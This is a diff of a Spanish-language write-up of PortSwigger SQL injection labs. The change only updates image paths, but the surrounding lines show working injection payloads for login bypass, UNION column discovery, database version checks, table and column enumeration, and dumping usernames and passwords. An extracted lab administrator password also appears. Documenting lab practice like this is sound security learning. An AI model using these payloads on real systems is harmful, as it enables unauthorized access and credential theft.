@@ -36,7 +36,7 @@ en este caso la solución es que rellenar los espacios por + , pero es que tambi
 '+OR+1=1--
 ```
 
-![](2022-07-06-11-37-17.png)
+![](assets/2022-07-06-11-37-17.png)
 
 ## Lab: SQL injection vulnerability allowing login bypass
 
@@ -46,7 +46,7 @@ To solve the lab, perform an SQL injection attack that logs in to the applicatio
 
 Se soluciona poniendo administrator'-- y en el password ''
 
-![](2022-07-06-11-54-04.png)
+![](assets/2022-07-06-11-54-04.png)
 
 ## Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
@@ -100,9 +100,9 @@ Make the database retrieve the string: 'QhDKgq'
 /filter?category=Accessories'+UNION+SELECT+NULL,'QhDKgq',NULL--   --> y solved
 ```
 
-![](2022-07-06-14-07-42.png)
+![](assets/2022-07-06-14-07-42.png)
 
-![](2022-07-06-14-08-03.png)
+![](assets/2022-07-06-14-08-03.png)
 
 ## Lab: SQL injection attack, querying the database type and version on Oracle
 
@@ -123,7 +123,7 @@ MySQL	        SELECT @@version
 
 No se si es que está bugueado o es así, nos aparece
 
-![](2022-07-06-19-08-52.png)
+![](assets/2022-07-06-19-08-52.png)
 
 
 Al tratarse de un oracle
@@ -134,7 +134,7 @@ Haríamos un
 
 '+UNION+SELECT+BANNER+FROM+v$version--
 
-![](2022-07-06-19-34-58.png)
+![](assets/2022-07-06-19-34-58.png)
 
 Nos sale un error, es posible que sea porque tiene más de un elemento en la tabla, así que le vamos añadiendo null
 
@@ -171,7 +171,7 @@ Vemos que nos da error de server. en los laboratorios mejor ir a burpsuite porqu
 
 Lo primero que tenemos que hacer es probar lo básico que es ```'--```
 
-![](2022-07-06-20-02-17.png)
+![](assets/2022-07-06-20-02-17.png)
 
 
 No nos funciona.. por lo que o no es explotable o hay algún fallo, por lo que voy a ver
@@ -186,7 +186,7 @@ MySQL	#comment
 
 
 
-![](2022-07-06-20-04-55.png)
+![](assets/2022-07-06-20-04-55.png)
 
 Vale hay que poner '#  probé antes el '-- con espacio al final como pone pero no funcionó
 
@@ -200,11 +200,11 @@ El problema es que no nos aparece nada, solo gifts por lo que no está continuan
 
 Por lo que le añadimos los + y vemos que tal
 
-![](2022-07-06-20-08-08.png)
+![](assets/2022-07-06-20-08-08.png)
 
 le añadimos un ,NULL y vemos
 
-![](2022-07-06-20-08-31.png)
+![](assets/2022-07-06-20-08-31.png)
 
 Ya nos da 200 , a ver el laboratorio y ya está resuelto.
 
@@ -263,18 +263,18 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    1. '+UNION+SELECT+table_name.null+FROM+all_tables-- --> return 500
    2. '+UNION+SELECT+table_name,null+FROM+information_schema.tables-- return 200 
-    ![](2022-07-07-10-22-35.png)
+    ![](assets/2022-07-07-10-22-35.png)
 
 4. Obtener la lista de usuarios
 
-![](2022-07-07-11-52-10.png)
+![](assets/2022-07-07-11-52-10.png)
 
 users_squnln
 
 ```bash 
 '+UNION+SELECT+column_name,+null+FROM+information_schema.columns+where+table_name='users_squnln'--
 ```
-![](2022-07-07-11-54-18.png)
+![](assets/2022-07-07-11-54-18.png)
 
 Las columas son username_lfvohu y password_zyocjv
 
@@ -283,11 +283,11 @@ Las columas son username_lfvohu y password_zyocjv
    ' UNION SELECT username_lfvohu, password_zyocjv FROM users_squnln--
 
 
-![](2022-07-07-11-58-32.png)
+![](assets/2022-07-07-11-58-32.png)
 
 Ahora solo vamos a login y ponemos nuestras credenciales
 
-![](2022-07-07-11-59-27.png)
+![](assets/2022-07-07-11-59-27.png)
 
 
 ## Lab: SQL injection attack, listing the database contents on Oracle
@@ -310,7 +310,7 @@ Oracle
 
 1. Añadiendo el order by vemos el número de columnas.
 
-![](2022-07-07-12-05-48.png)
+![](assets/2022-07-07-12-05-48.png)
 
 2. No suelo buscar la posicion cuando hay 2 columnas nada más...Tenemos que saber que oracle de por si no acepta no poner un from por lo que el típico
 ```bash
@@ -322,7 +322,7 @@ Usamos la tabla dual
 ```
 ' UNION SELECT NULL, NULL FROM DUAL--  debería de funciona
 ```
-![](2022-07-07-12-23-44.png)
+![](assets/2022-07-07-12-23-44.png)
 
 A mi no me suele gustar buscar los caracteres en este tipo de ejercicios porque se pierde tiempo, solo hay que ir añadiendo , null 
 
@@ -336,7 +336,7 @@ Oracle	    SELECT banner FROM v$version
 
 CORE	11.2.0.2.0	Production
 
-![](2022-07-07-12-27-25.png)
+![](assets/2022-07-07-12-27-25.png)
 
 4. Buscamos el nombre de la tabla
 
@@ -350,7 +350,7 @@ CORE	11.2.0.2.0	Production
 
  Buscando en google 
 
- ![](2022-07-07-12-32-41.png)
+ ![](assets/2022-07-07-12-32-41.png)
 
 ```bash
 #recordar el control + u o cambiar directamente los espacios por +
@@ -360,7 +360,7 @@ Importante, estuve mirando en buspsuite los resultados y en esta base de datos h
 
 USERS_ACJIGK
 
-![](2022-07-07-13-00-24.png)
+![](assets/2022-07-07-13-00-24.png)
 
 
 5. Miramos las columnas dentro de la tabla econtrada anteriormente
@@ -379,11 +379,11 @@ USERNAME_AZKWYI
 ```bash
 ' UNION SELECT PASSWORD_IRIOUY , USERNAME_AZKWYI FROM USERS_ACJIGK--
 ```
-![](2022-07-07-13-04-52.png)
+![](assets/2022-07-07-13-04-52.png)
 
 7 Entramos como administrator y terminado.
 
-![](2022-07-07-13-23-13.png)
+![](assets/2022-07-07-13-23-13.png)
 
 
 ## Lab: SQL injection UNION attack, retrieving data from other tables
@@ -399,7 +399,7 @@ No coment sobre el laboratorio después de hacer los anteriores...
 ```bash
 '+UNION+SELECT+username,+password+FROM+users--
 ```
-![](2022-07-07-13-39-40.png)
+![](assets/2022-07-07-13-39-40.png)
 
 ## Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
@@ -435,7 +435,7 @@ MySQL	        'foo' 'bar' [Note the space between the two strings]
 
 sería algo así
 
-![](2022-07-07-13-53-38.png)
+![](assets/2022-07-07-13-53-38.png)
 
 ' UNION SELECT username || '~' || password FROM users-- 
 
@@ -447,13 +447,13 @@ He probado inicilamente añadiendo el null después como siempre, pero parece qu
 ' UNION SELECT NULL, username || '~' || password FROM users-- 
 ```
 
-![](2022-07-07-13-55-59.png)
+![](assets/2022-07-07-13-55-59.png)
 
 administrator~ymhir2k2apjk138ealjm
 
 administrator
 ymhir2k2apjk138ealjm
 
-![](2022-07-07-13-58-16.png)
+![](assets/2022-07-07-13-58-16.png)
 
 
